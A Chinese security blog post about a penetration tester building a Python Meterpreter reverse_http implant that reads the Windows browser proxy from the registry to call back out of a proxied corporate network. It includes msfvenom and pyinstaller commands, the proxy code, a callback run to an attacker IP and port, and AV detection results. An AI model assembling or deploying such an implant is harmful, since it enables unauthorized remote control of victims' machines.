*****本文原创作者：delay，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
**

**2017年初的项目中，我发现某客户单位的员工办公终端未进行内/外网物理隔离，内网通过设置浏览器代理服务器访问公网，遂向客户提出风险。但口说无凭，需证明此风险，故编写此程序。此次风险说明与程序编写，是在“永恒之蓝/WannaCry”勒索软件爆发前一周，虽然提出风险，但无法整改，客户单位还是沦陷了。**

其实当时想的蛮简单的，利用Metasploit中的meterpreter/reverse_tcp让终端反向连接客户端即可，事实证明，代理服务器不处理tcp连接，只转发HTTP请求，此路不通。那就使用meterpreter/reverse_http吧，但Metasploit又不支持自动设置代理，最后的思路是，找到meterpreter/reverse_http源码并更改，使其自动抓取浏览器代理地址并反向连接客户端。

思路有了，然后就是选择语言，理论上用汇编/C/C++会更好，但我不会。再加上我只是想证明此问题，并不是真要编写木马程序，所以选择了Python，Payload最终选择python/meterpreter/reverse_http。

## 获取源码

相对于常用的msfconsole，msfvenom显得陌生了许多，帮助信息如下：

![image.png](https://image.3001.net/images/20180321/15216126052448.png!small)  

支持的生成格式：  

![image.png](https://image.3001.net/images/20180321/15216126611063.png!small)  

其中raw为原始格式，使用命令，结果如下：

    
    
    msfvenom -p python/meterpreter/reverse_http -f raw  
    

![image.png](https://image.3001.net/images/20180321/15216129845558.png!small)  

将结果使用base64解码后，可见服务器端地址：

![image.png](https://image.3001.net/images/20180321/15216130537557.png!small)  

到此可以了解Metasploit总这块大致的原理：远程加载python代码并执行，这样一是可以减少客户端的体积，二是可以更改攻击行为。

## 获取并使用浏览器代理

Windows中的配置一般存储在注册表中，浏览器代理地址也不例外，注册表键值为HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet
Settings：

![image.png](https://image.3001.net/images/20180321/1521613288910.png!small)  

其中ProxyEnable代表是否使用代理，ProxyServer为代理地址，抓取并使用代理的代码如下：  

    
    
    import _winreg
    
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
    enable = _winreg.QueryValueEx(key,"ProxyEnable")
    if  enable[0]:
    print 'Use Proxy'
        name = _winreg.QueryValueEx(key, "ProxyServer")
        pip = name[0].split(':')[0]
        pport = name[0].split(':')[1]
        server = pip + ':' + pport
    print server
    else:
    print 'No Proxy'  
    

使用urllib2的proxyhandler将所有http请求绑定到代理服务器：  

    
    
    proxy = urllib2.ProxyHandler({'http': server})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)  
    

这样，检测程序的基本框架就完成了。

##  **参数**

为了复用，添加两个参数-i为服务端地址，-p为服务端端口：

    
    
    import optparse
    
    parser = optparse.OptionParser('Program usage: httpControl.exe -i IP -p Port')
    parser.add_option('-i', dest='IP', type='string', help='IP address')
    parser.add_option('-p', dest='Port', type='string', help='Port Number')
    options, args = parser.parse_args()  
    

##  **编译**

由于客户端要运行服务端源码，需要将所有包全部引入：

    
    
    #coding=utf8
    import binascii
    import code
    import os
    import platform
    import random
    import re
    import select
    import socket
    import struct
    import subprocess
    import sys
    import threading
    import time
    import traceback
    import shutil
    import _winreg
    import urllib2
    import optparse  
    

使用pyinstaller打包py文件为exe文件：

    
    
    pyinstaller -F E:\Python\TEMP\httpControl\httpControl.py

##  **验证**

配置服务端，当时我使用了日本的VPS，这里使用了虚拟机：

![image.png](https://image.3001.net/images/20180321/15216142161999.png!small)  

客户端执行验证程序：

    
    
    httpControl.exe -i 192.168.111.111 -p 8888
    

客户端结果如下

![image.png](https://image.3001.net/images/20180321/15216144183220.png!small)  

至此，验证程序编写完毕。

##  **后记**

这个程序我第一次尝试编写，未增加任何免杀策略，但是，查杀结果如下：

![image.png](https://image.3001.net/images/20180321/15216146736852.png!small)  

这次还有11个，去年的时候我记得是只有3个杀软可以检测出来。客户公司员工办公终端装有某付费S开头杀毒软件，部分员工自主装有360。

> 1.程序上传时均未检测为恶意软件；
>
> 2.执行ls,cat,download命令时，均未进行拦截；
>
> 3.尝试使用敏感命令net user /add，只有360进行拦截。

结论：对于原创的恶意程序，杀毒软件还是要延后许多，360的“主动防御”进程可以起到一定作用。还是不要使用来历不明的程序了。

***本文原创作者：delay，本文属FreeBuf原创奖励计划，未经许可禁止转载**

